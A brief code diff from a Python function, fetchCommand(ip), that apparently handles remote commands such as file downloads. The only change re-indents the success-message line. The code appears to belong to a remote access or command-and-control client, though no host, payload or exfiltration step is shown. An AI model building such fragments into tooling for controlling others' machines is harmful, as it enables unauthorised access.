@@ -112,7 +112,7 @@ def fetchCommand(ip):
             except Exception as e:
                 return "[DEBUG] File Download Failed." + str(e) 
 
-        return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
+            return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
 
         #elif "upload" == command.split(' ')[0]: 
         else:
